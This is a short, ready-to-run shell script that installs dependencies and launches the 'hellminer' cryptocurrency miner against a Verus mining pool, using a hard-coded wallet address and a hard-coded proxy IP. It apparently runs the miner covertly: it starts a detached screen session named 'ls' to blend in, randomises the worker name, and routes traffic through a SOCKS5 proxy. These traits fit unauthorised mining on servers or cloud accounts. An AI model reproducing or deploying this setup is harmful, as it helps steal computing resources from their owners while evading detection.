sudo apt update 
sudo apt install screen libjansson4 -y
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RTB8Yi3AbEqHqrsjs1VXm8YCssK8xfZMce
WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
PROXY=socks5://178.162.111.220:1080
./hellminer -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
